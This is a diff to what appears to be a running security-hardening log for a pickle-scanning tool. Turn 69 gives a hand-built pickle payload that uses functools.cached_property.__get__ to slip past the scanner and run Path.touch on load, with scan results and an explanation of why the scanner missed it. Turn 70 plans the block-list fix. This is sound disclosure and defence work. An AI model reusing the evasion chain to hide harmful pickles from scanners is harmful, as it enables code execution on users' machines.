@@ -3163,3 +3163,128 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add descriptor-object tracking, dotted-name
 expansion, or stack-flow simulation.
+
+## Turn 69 - `functools.cached_property.__get__` descriptor getter gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `cached_property` to call
+an attacker-selected getter during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_functools_cached_property_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("types", "new_class"),
+        s("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85\x86R\x940",
+        b"h\x00",
+        s(str(marker)),
+        b"\x85R\x940",
+        sg("functools", "cached_property"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R\x940",
+        sg("functools", "cached_property.__set_name__"),
+        b"(",
+        b"h\x02",
+        b"h\x00",
+        s("x"),
+        b"tR0",
+        sg("functools", "cached_property.__get__"),
+        b"(",
+        b"h\x02",
+        b"h\x01",
+        b"h\x00",
+        b"tR.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=263`, `bytes_total=263`, `opcode_count=49`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `types.new_class`, `pathlib.PosixPath`,
+  `functools.cached_property`, `pathlib.Path.touch`,
+  `functools.cached_property.__set_name__`, and
+  `functools.cached_property.__get__`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final descriptor-get call returns
+  `<functools.cached_property ...>` with `attrname="x"` and does not create
+  `/tmp/ma_functools_cached_property_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_functools_cached_property_marker` and returns `None`
+- RCE mechanism: `cached_property.__get__(descriptor, instance, owner)` reads
+  `instance.__dict__`, calls `descriptor.func(instance)`, then caches the
+  result. The payload uses `types.new_class("DerivedPath", (PosixPath,))` to
+  create a path subclass with an instance dictionary, arms
+  `cached_property(Path.touch)` with `__set_name__`, and finally calls
+  `cached_property.__get__(descriptor, marker_instance, DerivedPath)`, causing
+  `Path.touch(marker_instance)` to execute before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `functools.cached_property` is absent from `DANGEROUS_GLOBALS`; current
+  `functools` critical coverage includes `cache`, `lru_cache`, `reduce`, and
+  `singledispatch`.
+- `functools.cached_property.__set_name__` and
+  `functools.cached_property.__get__` are also absent from
+  `DANGEROUS_GLOBALS`.
+- `types.new_class` is absent from `DANGEROUS_GLOBALS`; it is used here to
+  create a `PosixPath` subclass with a `__dict__`, which lets
+  `cached_property.__get__` reach the wrapped getter.
+- The payload uses only currently clean globals:
+  `types.new_class`, `pathlib.PosixPath`, `functools.cached_property`,
+  `pathlib.Path.touch`, `functools.cached_property.__set_name__`, and
+  `functools.cached_property.__get__`.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a descriptor-getter sink with a precise static name.
+The focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
+`("functools", "cached_property.__get__")`, plus a manual-pickle oracle
+regression proving scan-time detection before the descriptor getter creates
+the marker. Blocking `cached_property.__set_name__` or `types.new_class` is not
+required for this specific sink, so the hot path can remain one static
+binary-search policy lookup.
+
+## Turn 70 - Block `functools.cached_property.__get__` descriptor getters
+
+Blocking plan:
+
+- Add `("functools", "cached_property.__get__")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. The descriptor-get method invokes the wrapped
+  getter callable when accessed with an instance.
+- Leave `functools.cached_property`, `cached_property.__set_name__`, and
+  `types.new_class` allowed for this focused block. The execution sink is
+  `cached_property.__get__`; the other helpers only construct the descriptor,
+  name it, and create the path subclass needed by the proof.
+- Add a CPython oracle regression that builds the manual
+  `cached_property(Path.touch)` payload, verifies the descriptor setup control
+  still scans clean and does not create the marker, then verifies scan-time
+  detection on the RCE variant before proving the getter creates the marker
+  during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add descriptor-object tracking, cached-property
+state modeling, or stack-flow simulation.
